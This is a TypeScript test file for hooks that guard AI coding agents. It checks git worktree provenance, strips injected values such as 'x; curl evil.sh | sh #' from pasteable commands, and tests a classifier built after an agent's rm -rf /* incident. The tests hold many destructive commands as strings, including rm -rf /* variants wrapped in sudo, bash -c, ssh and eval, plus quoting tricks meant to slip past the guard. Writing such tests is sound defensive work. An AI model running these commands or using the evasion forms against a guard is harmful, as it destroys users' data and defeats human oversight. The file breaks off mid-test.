import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { join } from "path";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import {
  claimCommand,
  classifyDangerousOperation,
  emptyExpansionCollapse,
  getAgentName,
  gitCommandInfo,
  gitRemoteHostSlug,
  managedWorktreeInfo,
  SYSTEM_PROTECTED_ROOTS,
} from "./codewith-native-common";

describe("codewith native common helpers", () => {
  test("gitCommandInfo detects global option commit/push forms and target cwd", () => {
    const base = mkdtempSync(join(tmpdir(), "hooks-common-"));
    try {
      expect(gitCommandInfo("git -c user.name=test commit -m test", base)?.action).toBe("commit");
      expect(gitCommandInfo("git -C ./repo push origin feature", base)).toMatchObject({
        action: "push",
        targetCwd: join(base, "repo"),
      });
      expect(gitCommandInfo("git --git-dir .git --work-tree . commit", base)).toMatchObject({
        action: "commit",
        targetCwd: base,
      });
    } finally {
      rmSync(base, { recursive: true, force: true });
    }
  });

  describe("managedWorktreeInfo canonical path shape (Agent Operating Rules rule 8)", () => {
    let tmp: string;
    let root: string;
    let previous: string | undefined;

    beforeEach(() => {
      tmp = mkdtempSync(join(tmpdir(), "hooks-worktrees-"));
      root = join(tmp, "worktrees");
      previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
      process.env.HASNA_REPOS_WORKTREES_ROOT = root;
    });

    afterEach(() => {
      if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
      else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
      rmSync(tmp, { recursive: true, force: true });
    });

    const git = (cwd: string, ...args: string[]): void => {
      const result = Bun.spawnSync(["git", "-c", "user.name=t", "-c", "user.email=t@t.invalid", ...args], {
        cwd,
        stdout: "pipe",
        stderr: "pipe",
      });
      expect(result.stderr.toString(), args.join(" ")).toBe("");
    };

    /** A real repository, so provenance checks see what git actually writes. */
    const makeSourceRepo = (): string => {
      const source = join(tmp, `source-${Math.random().toString(36).slice(2)}`);
      mkdirSync(source, { recursive: true });
      git(source, "init", "-q", "-b", "main");
      writeFileSync(join(source, "README.md"), "fixture\n");
      git(source, "add", "README.md");
      git(source, "commit", "-qm", "fixture");
      return source;
    };

    /** A genuine linked worktree at the canonical path, created by git itself. */
    const makeWorktree = (repo: string, worktree: string, kind: "linked" | "standalone" = "linked"): string => {
      const worktreeRoot = join(root, repo, worktree);
      mkdirSync(join(root, repo), { recursive: true });
      if (kind === "standalone") {
        mkdirSync(worktreeRoot, { recursive: true });
        git(worktreeRoot, "init", "-q", "-b", "main");
      } else {
        git(makeSourceRepo(), "worktree", "add", "-q", "--detach", worktreeRoot);
      }
      return worktreeRoot;
    };

    test("accepts the canonical <repo-name>/<worktree-name> worktree root", () => {
      const worktreeRoot = makeWorktree("open-hooks", "OPE61-00004-worktree-guard");
      const info = managedWorktreeInfo(worktreeRoot);
      expect(info.managed).toBe(true);
      expect(info.layout).toBe("canonical");
      expect(info.repo).toBe("open-hooks");
      expect(info.worktree).toBe("OPE61-00004-worktree-guard");
      expect(info.worktreeRoot).toBe(worktreeRoot);
      expect(info.deprecated).toBeUndefined();
    });

    test("accepts a canonical path whose checkout is a standalone repo", () => {
      // Rule 8 governs where the checkout lives, not whether it is a linked worktree.
      expect(managedWorktreeInfo(makeWorktree("open-hooks", "standalone", "standalone")).managed).toBe(true);
    });

    test("rejects a forged .git file that grafts the path onto a shared checkout", () => {
      // A `.git` file is two lines of text. Pointing it at a shared checkout's `.git`
      // makes git commit/push from here land on that checkout — so shape and the mere
      // presence of `.git` are not evidence; provenance has to be proven.
      const shared = makeSourceRepo();
      const forged = join(root, "victimrepo", "wt");
      mkdirSync(forged, { recursive: true });
      writeFileSync(join(forged, ".git"), `gitdir: ${join(shared, ".git")}\n`);

      const info = managedWorktreeInfo(forged);
      expect(info.managed).toBe(false);
      expect(info.reason).toContain("provenance could not be verified");
    });

    test("rejects a .git directory grafted onto another repository", () => {
      const grafted = join(root, "victimrepo", "grafted");
      mkdirSync(join(grafted, ".git"), { recursive: true });
      writeFileSync(join(grafted, ".git", "HEAD"), "ref: refs/heads/main\n");
      writeFileSync(join(grafted, ".git", "commondir"), "/elsewhere/.git\n");

      expect(managedWorktreeInfo(grafted).reason).toContain("grafted onto another repository");
    });

    test("rejects a .git directory whose object or ref storage is symlinked away", () => {
      // Needs no write inside the victim: symlinking objects+refs makes commits here
      // land on the victim's refs, the same end state as a forged .git file.
      const shared = makeSourceRepo();
      for (const [name, store] of [["objects-graft", "objects"], ["refs-graft", "refs"]] as const) {
        const grafted = join(root, "victimrepo", name);
        mkdirSync(join(grafted, ".git"), { recursive: true });
        writeFileSync(join(grafted, ".git", "HEAD"), "ref: refs/heads/main\n");
        for (const dir of ["objects", "refs"]) {
          if (dir === store) symlinkSync(join(shared, ".git", dir), join(grafted, ".git", dir));
          else mkdirSync(join(grafted, ".git", dir), { recursive: true });
        }
        const info = managedWorktreeInfo(grafted);
        expect(info.managed, name).toBe(false);
        expect(info.reason, name).toContain(`${store} is grafted onto another repository`);
      }
    });

    test("rejects a worktree whose repository no longer registers it", () => {
      // Real fleet state: the parent repo was pruned, so git itself refuses to work here.
      const worktreeRoot = makeWorktree("open-hooks", "orphaned");
      rmSync(join(tmp, "..", "unused"), { recursive: true, force: true });
      writeFileSync(join(worktreeRoot, ".git"), "gitdir: /nonexistent/.git/worktrees/orphaned\n");

      expect(managedWorktreeInfo(worktreeRoot).managed).toBe(false);
    });

    test("accepts subdirectories of a canonical worktree", () => {
      const worktreeRoot = makeWorktree("open-hooks", "OPE61-00004-worktree-guard");
      mkdirSync(join(worktreeRoot, "hooks", "worktree-guard", "src"), { recursive: true });

      for (const nested of [
        join(worktreeRoot, "hooks"),
        join(worktreeRoot, "hooks", "worktree-guard", "src"),
      ]) {
        const info = managedWorktreeInfo(nested);
        expect(info.managed).toBe(true);
        expect(info.layout).toBe("canonical");
        expect(info.worktreeRoot).toBe(worktreeRoot);
      }
    });

    test("rejects a subdirectory of a flat worktree, which has the canonical shape", () => {
      // The whole point of the flat prohibition: `<root>/<flat-wt>/<subdir>` is
      // shape-identical to `<root>/<repo>/<worktree>`, so a `cd` must not launder it.
      const flat = join(root, "open-hooks-flat-worktree");
      mkdirSync(join(flat, "src"), { recursive: true });
      git(makeSourceRepo(), "worktree", "add", "-q", "--detach", join(flat, "checkout"));

      const info = managedWorktreeInfo(join(flat, "src"));
      expect(info.managed).toBe(false);
      expect(info.reason).toContain("is not a git worktree root (no .git)");
    });

    test("rejects a canonical-shaped path that is not a worktree root", () => {
      mkdirSync(join(root, "invented", "worktree"), { recursive: true });
      expect(managedWorktreeInfo(join(root, "invented", "worktree")).reason).toContain("not a git worktree root");
      expect(managedWorktreeInfo(join(root, "never", "created")).reason).toContain("no worktree exists at");
    });

    test("rejects a canonical-shaped path reached through a symlink", () => {
      // A symlinked segment can aim a compliant-looking path at a shared checkout.
      const shared = join(tmp, "shared-checkout");
      mkdirSync(shared, { recursive: true });
      writeFileSync(join(shared, ".git"), "gitdir: /elsewhere\n");
      mkdirSync(join(root, "open-hooks"), { recursive: true });
      symlinkSync(shared, join(root, "open-hooks", "linked"));
      symlinkSync(join(tmp, "shared-checkout"), join(root, "linked-repo"));
      mkdirSync(join(tmp, "shared-checkout", "wt"), { recursive: true });

      expect(managedWorktreeInfo(join(root, "open-hooks", "linked")).reason).toContain("traverses a symlink");
      expect(managedWorktreeInfo(join(root, "linked-repo", "wt")).reason).toContain("traverses a symlink");
    });

    test("rejects a flat single-segment worktree under the worktrees root", () => {
      const info = managedWorktreeInfo(join(root, "open-hooks-flat-worktree"));
      expect(info.managed).toBe(false);
      expect(info.layout).toBeUndefined();
      expect(info.reason).toContain("flat under the worktrees root");
      expect(info.reason).toContain(join(root, "<repo-name>", "<worktree-name>"));
    });

    test("rejects the worktrees root itself", () => {
      const info = managedWorktreeInfo(root);
      expect(info.managed).toBe(false);
      expect(info.reason).toContain("worktrees root itself");
    });

    test("rejects paths outside the worktrees root", () => {
      const info = managedWorktreeInfo(join(tmp, "elsewhere", "open-hooks"));
      expect(info.managed).toBe(false);
      expect(info.reason).toBe("outside worktrees root");
    });

    test("rejects a station-id segment in front of <repo>/<worktree>", () => {
      const info = managedWorktreeInfo(join(root, "station01", "open-hooks", "OPE61-00004-worktree-guard"));
      expect(info.managed).toBe(false);
      expect(info.reason).toContain("station-id/machine segment or extra nesting");
      expect(info.reason).toContain(join(root, "<repo-name>", "<worktree-name>"));
    });

    const LEASE = ["station01", "open-hooks-a55c105a", "wt_2ab04216a30ef5ece642792e"];

    /** The historical lease layout, with the checkout at the lease dir or in `repo/`. */
    const makeLeaseWorktree = (nested: boolean): string => {
      const leaseRoot = join(root, ...LEASE);
      const checkout = nested ? join(leaseRoot, "repo") : leaseRoot;
      mkdirSync(join(checkout, ".."), { recursive: true });
      git(makeSourceRepo(), "worktree", "add", "-q", "--detach", checkout);
      return checkout;
    };

    test("rejects the deprecated station-id lease layout, labelling it for migration", () => {
      const info = managedWorktreeInfo(makeLeaseWorktree(false));
      expect(info.managed).toBe(false);
      expect(info.layout).toBe("legacy-station-lease");
      expect(info.deprecated).toBe(true);
      expect(info.reason).toContain("deprecated station-id lease layout");
      expect(info.reason).toContain(join(root, "<repo-name>", "<worktree-name>"));
    });

    test("recognises the legacy lease layout from inside it, like a canonical subdirectory", () => {
      const leaseRoot = makeLeaseWorktree(false);
      mkdirSync(join(leaseRoot, "src"), { recursive: true });
      const info = managedWorktreeInfo(join(leaseRoot, "src"));
      expect(info.layout).toBe("legacy-station-lease");
      expect(info.worktreeRoot).toBe(leaseRoot);
    });

    test("recognises the legacy variant whose checkout sits in a repo/ child", () => {
      const checkout = makeLeaseWorktree(true);
      const info = managedWorktreeInfo(checkout);
      expect(info.layout).toBe("legacy-station-lease");
      expect(info.worktreeRoot).toBe(checkout);
    });

    test("does not let the legacy lease name pattern launder an ungrounded path", () => {
      // The migration tolerance grants a weaker verdict than "blocked", so two
      // directories named to match the pattern must not buy it without provenance.
      const shared = makeSourceRepo();
      mkdirSync(join(root, "anything", "y-abcdef1"), { recursive: true });
      symlinkSync(shared, join(root, "anything", "y-abcdef1", "wt_0123456789abcdef"));
      mkdirSync(join(root, "other", "z-abcdef1", "wt_0123456789abcdef"), { recursive: true });

      for (const forged of [
        join(root, "anything", "y-abcdef1", "wt_0123456789abcdef"),
        join(root, "other", "z-abcdef1", "wt_0123456789abcdef"),
      ]) {
        const info = managedWorktreeInfo(forged);
        expect(info.managed, forged).toBe(false);
        expect(info.layout, forged).toBeUndefined();
      }
    });

    test("rejects nesting deeper than the canonical shape", () => {
      const info = managedWorktreeInfo(join(root, "station01", "open-hooks", "wt-name", "repo"));
      expect(info.managed).toBe(false);
      expect(info.layout).toBeUndefined();
      expect(info.reason).toContain("station-id/machine segment or extra nesting");
    });

    test("rejects malformed canonical segments", () => {
      expect(managedWorktreeInfo(join(root, "-bad-repo", "worktree")).reason).toContain("repo-name segment is malformed");
      expect(managedWorktreeInfo(join(root, "open-hooks", "-bad-worktree")).reason).toContain("worktree-name segment is malformed");
      expect(managedWorktreeInfo(join(root, ".hidden", "worktree")).reason).toContain("repo-name segment is malformed");
      expect(managedWorktreeInfo(join(root, "open-hooks", ".git")).reason).toContain("worktree-name segment is malformed");
    });

    test("accepts ordinary directory names an allowlist would wrongly reject", () => {
      // Observed on the fleet: connectors/_base. Long and punctuated names are legal
      // directory names, so the guard must not invent a stricter naming rule.
      for (const [repo, worktree] of [
        ["connectors", "_base"],
        ["c++utils", "OPE61-00004"],
        ["open-hooks", "e".repeat(200)],
        ["Open-Hooks", "task~1 with spaces"],
      ]) {
        expect(managedWorktreeInfo(makeWorktree(repo!, worktree!)).managed, `${repo}/${worktree}`).toBe(true);
      }
    });
  });

  test("claimCommand renders the canonical worktree path template", () => {
    const previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
    process.env.HASNA_REPOS_WORKTREES_ROOT = "/root/worktrees";
    try {
      // The canonical repo name comes from the repos CLI, and is frequently not the
      // git remote basename: `open-hooks` is `github.com/hasna/hooks`.
      expect(claimCommand("open-hooks", "OPE61-00004", "main")).toBe(
        "git worktree add -b OPE61-00004 /root/worktrees/open-hooks/OPE61-00004 origin/main && repos scan",
      );
      expect(claimCommand(null, null)).toContain("/root/worktrees/<repo-name>/<worktree-name>");
      expect(claimCommand("open-hooks", "OPE61-00004")).toContain("origin/<default-branch>");
    } finally {
      if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
      else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
    }
  });

  test("claimCommand never derives the repo segment from a remote slug", () => {
    // `hasna/hooks` is this repo's remote slug; its canonical name is `open-hooks`.
    // Silently taking the basename would emit `hooks/`, a directory that does not
    // exist — so a slug must be refused outright, not trimmed into a plausible lie.
    const previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
    process.env.HASNA_REPOS_WORKTREES_ROOT = "/root/worktrees";
    try {
      const fromSlug = claimCommand("hasna/hooks", "OPE61-00004");
      expect(fromSlug).toContain("/root/worktrees/<repo-name>/OPE61-00004");
      expect(fromSlug).not.toContain("/root/worktrees/hooks/");
      expect(claimCommand(null, "OPE61-00004")).toContain("/root/worktrees/<repo-name>/OPE61-00004");
    } finally {
      if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
      else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
    }
  });

  test("claimCommand refuses to interpolate unsafe values into a pasteable command", () => {
    // taskIdFrom() reads unvalidated hook input, and the repo name is influenced by
    // the git remote, so this is where both get validated.
    const previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
    process.env.HASNA_REPOS_WORKTREES_ROOT = "/root/worktrees";
    try {
      const safe = "git worktree add -b <worktree-name> /root/worktrees/open-hooks/<worktree-name> origin/<default-branch> && repos scan";
      for (const hostile of ["x; curl evil.sh | sh #", "--upload-pack=/tmp/x", "a`id`", "a$(id)", "-b", "..", "a b"]) {
        // Hostile input never reaches the rendered command; it degrades to the placeholder.
        expect(claimCommand("open-hooks", hostile), hostile).toBe(safe);
      }
      for (const hostile of ["hasna/hooks", "../../etc", "-repo", "a;b"]) {
        expect(claimCommand(hostile, "OPE61-00004"), hostile).toContain("/root/worktrees/<repo-name>/OPE61-00004");
      }
      expect(claimCommand("open-hooks", "OPE61-00004", "main; rm -rf /")).toContain("origin/<default-branch>");
    } finally {
      if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
      else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
    }
  });

  test("respond writes the whole verdict even when the process exits immediately", async () => {
    // process.stdout.write is async on a pipe, so a verdict larger than the pipe
    // buffer used to be truncated by the exit — and a truncated verdict is unparseable.
    const script = join(mkdtempSync(join(tmpdir(), "hooks-respond-")), "emit.ts");
    writeFileSync(script, [
      `import { respond } from ${JSON.stringify(join(import.meta.dir, "codewith-native-common"))};`,
      `respond({ decision: "block", reason: "x".repeat(1048576) });`,
      "process.exit(0);",
    ].join("\n"));

    const proc = Bun.spawn([process.execPath, "run", script], { stdout: "pipe", stderr: "pipe" });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;

    expect(stdout.length).toBeGreaterThan(1048576);
    expect(JSON.parse(stdout).reason).toHaveLength(1048576);
  });

  test("gitRemoteHostSlug normalises origin to the repos CLI's exact host/org/name form", async () => {
    const base = mkdtempSync(join(tmpdir(), "hooks-remote-"));
    try {
      const cases: Array<[string, string | null]> = [
        ["https://github.com/hasna/hooks.git", "github.com/hasna/hooks"],
        ["https://github.com/hasna/hooks", "github.com/hasna/hooks"],
        ["git@github.com:hasna/hooks.git", "github.com/hasna/hooks"],
        ["ssh://git@github.com/hasna/hooks.git", "github.com/hasna/hooks"],
        // Not an org/name pair, so there is no exact repos CLI key to look up.
        ["https://example.com/hooks.git", null],
      ];

      for (const [remote, expected] of cases) {
        const repo = join(base, `repo-${cases.findIndex(([r]) => r === remote)}`);
        mkdirSync(repo, { recursive: true });
        expect(Bun.spawnSync(["git", "init", "-q"], { cwd: repo }).exitCode).toBe(0);
        expect(Bun.spawnSync(["git", "remote", "add", "origin", remote], { cwd: repo }).exitCode).toBe(0);
        expect(await gitRemoteHostSlug(repo), remote).toBe(expected);
      }
    } finally {
      rmSync(base, { recursive: true, force: true });
    }
  });

  test("getAgentName reads Codewith input.agent profile injection", () => {
    const saved = {
      HOOKS_AGENT_NAME: process.env.HOOKS_AGENT_NAME,
      CODEWITH_AGENT_NAME: process.env.CODEWITH_AGENT_NAME,
      CONVERSATIONS_AGENT_ID: process.env.CONVERSATIONS_AGENT_ID,
    };
    delete process.env.HOOKS_AGENT_NAME;
    delete process.env.CODEWITH_AGENT_NAME;
    delete process.env.CONVERSATIONS_AGENT_ID;
    try {
      expect(getAgentName({ agent: { name: "profile-agent" } })).toBe("profile-agent");
      expect(getAgentName({ agent: { agent_id: "profile_id" } })).toBe("profile_id");
    } finally {
      for (const [key, value] of Object.entries(saved)) {
        if (value === undefined) delete process.env[key];
        else process.env[key] = value;
      }
    }
  });
});

/**
 * Regression suite for the 2026-07-24 station02 data-destruction incident.
 *
 * A subagent composed `bash -c 'rm -rf "$(bun pm cache)"/* ; ... bun add -g ...'` and ssh'd
 * it to station02. `bun pm cache` exits 1 with an empty stdout when no package.json is found
 * walking up from cwd, so the substitution collapsed and the command ran as `rm -rf /*`. It
 * ran unprivileged for ~5 minutes, freed ~700 GB, and destroyed the org repo checkouts;
 * hasna/cloud's source is permanently gone.
 *
 * Every case below is a command STRING handed to the classifier. Nothing here executes any
 * rm, at any scope, ever.
 */
describe("destructive shell guard - rm -rf /* incident regression", () => {
  // The incident machine's HOME. Pinned as an explicit fixture so the three mandated
  // regression commands can appear verbatim rather than reconstructed from the runner's env.
  const INCIDENT_HOME = "/home/hasna";

  let scratchCwd: string;
  let savedHome: string | undefined;

  beforeAll(() => {
    // A cwd outside any git repo and outside every protected root, so a verdict is
    // attributable to the command under test rather than to where the suite happens to run.
    scratchCwd = mkdtempSync(join(tmpdir(), "hooks-destructive-"));
    savedHome = process.env.HOME;
  });

  afterAll(() => {
    if (savedHome === undefined) delete process.env.HOME;
    else process.env.HOME = savedHome;
    try { rmSync(scratchCwd, { recursive: true, force: true }); } catch {}
  });

  async function classify(command: string, options: { home?: string; cwd?: string } = {}) {
    process.env.HOME = options.home ?? INCIDENT_HOME;
    return classifyDangerousOperation({
      hook_event_name: "PreToolUse",
      tool_name: "Bash",
      cwd: options.cwd ?? scratchCwd,
      tool_input: { command },
    });
  }

  async function expectBlocked(command: string, options: { home?: string; cwd?: string } = {}) {
    const result = await classify(command, options);
    if (!result.block) throw new Error(`expected BLOCK, got continue for: ${command}`);
    return result;
  }

  async function expectAllowed(command: string, options: { home?: string; cwd?: string } = {}) {
    const result = await classify(command, options);
    if (result.block) throw new Error(`expected continue, got BLOCK (${result.reason}) for: ${command}`);
    return result;
  }

  // ---------------------------------------------------------------------------------------
  // The three fixtures mandated by the incident remediation, verbatim.
  // ---------------------------------------------------------------------------------------

  test("control: rm -rf /home/hasna/.hasna still blocks (guard is wired up at all)", async () => {
    const result = await expectBlocked("rm -rf /home/hasna/.hasna");
    expect(result.protectedLabel).toBe("Hasna state root ~/.hasna");
    expect(result.operation).toBe("rm -rf");
  });

  test("rm -rf /* blocks (was `continue` before this change)", async () => {
    const result = await expectBlocked("rm -rf /*");
    expect(result.protectedLabel).toBe("filesystem root /");
    expect(result.reason).toContain("rm -rf");
  });

  test('rm -rf "$(bun pm cache)"/* blocks (was `continue` before this change)', async () => {
    const result = await expectBlocked('rm -rf "$(bun pm cache)"/*');
    expect(result.targetPath).toBe("/*");
    expect(result.reason).toContain("collapses to /*");
    // A refusal that does not tell the agent what to do instead just gets retried.
    expect(result.reason).toContain("Safe alternative");
  });

  test("the realized incident command blocks", async () => {
    await expectBlocked(
      `bash -c 'rm -rf "$(bun pm cache)"/* ; bun add -g @hasna/connectors@1.3.45'`
    );
  });

  // ---------------------------------------------------------------------------------------
  // Rule 1 - system and filesystem roots.
  // ---------------------------------------------------------------------------------------

  test("recursive delete of the filesystem root blocks in bare and glob form", async () => {
    for (const command of ["rm -rf /", "rm -rf /*", "rm -rf /.*", "rm -rf /**"]) {
      const result = await expectBlocked(command);
      expect(result.protectedLabel).toBe("filesystem root /");
    }
  });

  test("recursive delete of every declared system root blocks, bare and wholesale-glob", async () => {
    for (const root of SYSTEM_PROTECTED_ROOTS) {
      if (root === "/") continue;
      // The label is asserted, not just the verdict: /home (and /root, /Users on machines
      // whose HOME sits under them) is also covered by the ~/.hasna tree rule, so a
      // verdict-only assertion would still pass with that entry deleted from the list.
      const bare = await expectBlocked(`rm -rf ${root}`);
      expect(bare.protectedLabel).toBe(`system root ${root}`);
      const glob = await expectBlocked(`rm -rf ${root}/*`);
      expect(glob.protectedLabel).toBe(`system root ${root}`);
    }
  });

  test("targeted deletes under a system root stay allowed", async () => {
    await expectAllowed("rm -rf /usr/local/lib/my-abandoned-build");
    await expectAllowed("rm -rf /var/log/my-app/old");
    await expectAllowed("rm -rf /opt/my-app/cache/*");
    // /tmp is deliberately not a protected root: scratch cleanup there is routine.
    await expectAllowed("rm -rf /tmp/scratch-1234");
    await expectAllowed("rm -rf /tmp/*");
  });

  test("a wholesale glob blocks where a narrower glob over the same directory does not", async () => {
    const home = mkdtempSync(join(tmpdir(), "hooks-glob-home-"));
    try {
      // ~/.hasna lives under `home`, so `home/*` destroys it but `home/proj*` cannot.
      await expectBlocked(`rm -rf ${home}/*`, { home });
      await expectAllowed(`rm -rf ${home}/proj*`, { home });
      await expectAllowed(`rm -rf ${home}/.cache`, { home });
    } finally {
      try { rmSync(home, { recursive: true, force: true }); } catch {}
    }
  });

  // ---------------------------------------------------------------------------------------
  // Rule 2 - expansions that can collapse to empty.
  // ---------------------------------------------------------------------------------------

  test("any expansion immediately followed by / blocks, whatever the expansion is", async () => {
    const commands = [
      'rm -rf "$(bun pm cache)"/*',
      "rm -rf $(bun pm cache)/*",
      "rm -rf `bun pm cache`/*",
      'rm -rf "$(some-command-nobody-has-written-yet --json)"/*',
      'rm -rf "${BUN_CACHE}"/*',
      'rm -rf "$BUN_CACHE"/*',
      'rm -rf "$1"/*',
      'rm -rf "$(dirname "$(which bun)")"/*',
      'rm -rf "$CACHE"/',
    ];
    for (const command of commands) {
      const result = await expectBlocked(command);
      expect(result.reason).toContain("collapses to");
    }
  });

  test('rm -rf "$HOME"/* blocks on the expanded path, before the collapse rule is needed', async () => {
    // Two independent mechanisms cover this one: $HOME expands to a real home whose wholesale
    // glob destroys ~/.hasna, and an empty $HOME would collapse the target to /*.
    const result = await expectBlocked('rm -rf "$HOME"/*');
    expect(result.protectedLabel).toBe("Hasna state root ~/.hasna");
    expect(emptyExpansionCollapse("$HOME/*")).toBe("/*");
  });

  test("stderr redirection does not launder the shape - it discards the diagnostic, not the path", async () => {
    await expectBlocked('rm -rf "$(bun pm cache 2>/dev/null)"/*');
  });

  test("an expansion collapsing onto a system root blocks even mid-path", async () => {
    await expectBlocked('rm -rf "$SYSROOT"/usr');
    await expectBlocked('rm -rf /opt/"$APP"/*');
  });

  test("rsync --delete and find -delete get the same collapse check as rm", async () => {
    await expectBlocked('rsync -a --delete empty/ "$(build-dir)"/');
    await expectBlocked('find "$(build-dir)"/ -delete');
  });

  /**
   * Deliberate non-block. `rm -rf "$(cmd)"` with an empty expansion becomes `rm -rf ""`,
   * which POSIX rm rejects ("cannot remove ''") with a non-zero exit and no deletion. The
   * entire catastrophic class is the trailing separator, which turns the empty string into
   * `/`. Blocking the bare form would break routine `rm -rf "$tmpdir"` cleanup for no gain.
   */
  test("the bare expansion form without a trailing separator stays allowed, by decision", async () => {
    await expectAllowed('rm -rf "$(mktemp -d)"');
    await expectAllowed('rm -rf "$BUILD_DIR"');
    expect(emptyExpansionCollapse('$(mktemp -d)')).toBeNull();
  });

  test("an expansion collapsing to a non-protected absolute path stays allowed", async () => {
    await expectAllowed('rm -rf "$BUILD_DIR"/dist');
    await expectAllowed('rm -rf "$HOME"/.cache/my-app');
    expect(emptyExpansionCollapse('"$BUILD_DIR"/dist'.replaceAll('"', ""))).toBe("/dist");
  });

  // ---------------------------------------------------------------------------------------
  // Evasion: the guard must not be defeated by spelling.
  // ---------------------------------------------------------------------------------------

  test("recursive-flag spellings, privilege prefixes and chaining do not evade the guard", async () => {
    const commands = [
      "rm -fr /*",
      "rm -R -f /*",
      "rm -Rf /*",
      "rm --recursive --force /*",
      "rm --force --recursive /*",
      "rm -r /*",
      "sudo rm -rf /*",
      "doas rm -rf /*",
      "FOO=bar BAZ=qux rm -rf /*",
      "/bin/rm -rf /*",
      "/usr/bin/rm -rf /*",
      "rm -rf -- /*",
      "true && rm -rf /*",
      "false; rm -rf /*",
      "echo starting\nrm -rf /*",
      "cd / && rm -rf *",
      "nice -n 19 rm -rf /*",
      "env FOO=1 rm -rf /*",
    ];
    for (const command of commands) await expectBlocked(command);
  });

  // ---------------------------------------------------------------------------------------
  // Wrappers. The realized incident was inside `bash -c` inside `ssh`, so this is required.
  // ---------------------------------------------------------------------------------------

  test("interpreter wrappers are unwrapped and scanned", async () => {
    const commands = [
      `bash -c 'rm -rf /*'`,
      `sh -c "rm -rf /*"`,
      `zsh -c 'rm -rf /*'`,
      `/bin/bash -c 'rm -rf /*'`,
      `bash -lc 'rm -rf /*'`,
      `bash -euxc 'rm -rf /*'`,
      `sudo bash -c 'rm -rf /*'`,
      `timeout 150 bash -c 'rm -rf "$(bun pm cache)"/*'`,
      `bash -c 'cd /tmp && rm -rf /*'`,
    ];
    for (const command of commands) await expectBlocked(command);
  });

  test("ssh remote commands are unwrapped and scanned, including nested interpreters", async () => {
    const commands = [
      `ssh station02 'rm -rf /*'`,
      `ssh -o BatchMode=yes -p 22 station02 'rm -rf /etc'`,
      `ssh -i /home/hasna/.ssh/id_ed25519 hasna@station02 'rm -rf /usr/*'`,
      `ssh station02 bash -c 'rm -rf /*'`,
      `timeout 150 ssh station02 'rm -rf "$(bun pm cache)"/* ; bun add -g @hasna/connectors@1.3.45'`,
    ];
    for (const command of commands) {
      const result = await expectBlocked(command);
      expect(result.reason).toContain("on a remote host");
    }
  });

  test("an unquoted ssh remote command still blocks, scanned as if it were local", async () => {
    // `ssh host rm -rf /*` puts a bare `rm` token in the outer command, so the ordinary local
    // scan catches it first. The verdict is the same; only the wording omits the remote host.
    await expectBlocked(`ssh station02 rm -rf /*`);
  });

  test("a relative target on a remote host is not resolved against the local cwd", async () => {
    // The remote `.` is not this machine's cwd, so guessing would be a false positive.
    await expectAllowed(`ssh station02 'rm -rf dist'`);
    await expectAllowed(`ssh station02 'rm -rf .'`);
    await expectAllowed(`ssh station02 'ls -la /'`);
  });

  // ---------------------------------------------------------------------------------------
  // False positives. A guard that blocks routine cleanup gets disabled, which is how this
  // class of incident recurs.
  // ---------------------------------------------------------------------------------------

  test("routine cleanup stays allowed", async () => {
    const commands = [
      "rm -rf dist",
      "rm -rf ./node_modules",
      "rm -rf dist .turbo build",
      "rm -rf ./dist/*",
      "rm -f /home/hasna/some-file.txt",
      "ls -la /",
      "du -sh /*",
      "git status",
      "find . -name '*.log' -print",
      "bun pm cache",
    ];
    for (const command of commands) await expectAllowed(command);
  });

  test("an unterminated substitution falls back to the plain tokenizer instead of swallowing the rest", async () => {
    await expectBlocked("echo $( ; rm -rf /*");
    await expectBlocked("echo ` ; rm -rf /*");
  });

  // ---------------------------------------------------------------------------------------
  // Adversarial pass. Each of these got a root wipe past an earlier draft of this guard.
  // ---------------------------------------------------------------------------------------

  test("quoting tricks that still resolve to the filesystem root are blocked", async () => {
    for (const command of [
      `rm -rf "/"*`,
      `rm -rf /"*"`,
      `rm -rf ''/*`,
      `rm -rf /./*`,
      `rm -rf /*/`,
      `rm -rf //*`,
      `rm -rf /home/hasna/../..`,
      `rm -rf ~/../*`,
      `rm -rf "$HOME/.."/*`,
      `rm -rf "$(bun pm cache)"/../*`,
      `rm -rf "$(bun pm cache)"//*`,
    ]) {
      await expectBlocked(command);
    }
  });

  test("cd moves the guard with it", async () => {
    await expectBlocked("cd / ; rm -rf *");
    await expectBlocked("cd /usr && rm -rf *");
    await expectBlocked(`sh -c 'cd / && rm -rf *'`);
    await expectBlocked(`ssh station02 "cd / && rm -rf *"`);
    // The incident shape moved one command to the left: an empty substitution leaves cd at /.
    await expectBlocked(`cd "$(bun pm cache)"/ && rm -rf ./*`);
    await expectBlocked(`bash -c 'cd "$(bun pm cache)"/ && rm -rf ./*'`);
  });

  test("cd into a resolved directory then clearing it stays allowed", async () => {
    // No trailing separator, so an empty substitution leaves cwd untouched rather than at /.
    await expectAllowed(`bash -c 'cd "$(bun pm cache)" && rm -rf ./*'`);
    await expectAllowed(`cd "$HOME/.cache/my-app" && rm -rf ./*`);
    await expectAllowed("cd /tmp && rm -rf my-scratch-dir");
  });

  test("eval and user-switch wrappers are unwrapped", async () => {
    await expectBlocked(`eval 'rm -rf /*'`);
    await expectBlocked(`su -c 'rm -rf /*'`);
    await expectBlocked(`su root -c 'rm -rf /*'`);
    await expectBlocked(`runuser -u hasna -c 'rm -rf /*'`);
  });

  test("a for-loop over a root glob is blocked even though the delete target is just $d", async () => {
    await expectBlocked(`for d in /*; do rm -rf "$d"; done`);
    await expectBlocked(`for p in /usr/* /etc/*; do rm -rf "$p"; done`);
    // The binding must actually be a root glob; ordinary loops stay allowed.
    await expectAllowed(`for d in ./build/*; do rm -rf "$d"; done`);
  });

  test('${VAR:?} is honoured as the non-empty assertion it is', async () => {
    // POSIX `:?` aborts on unset *or* empty, so this cannot collapse. Blocking the idiom the
    // guard's own message recommends would teach agents to drop it.
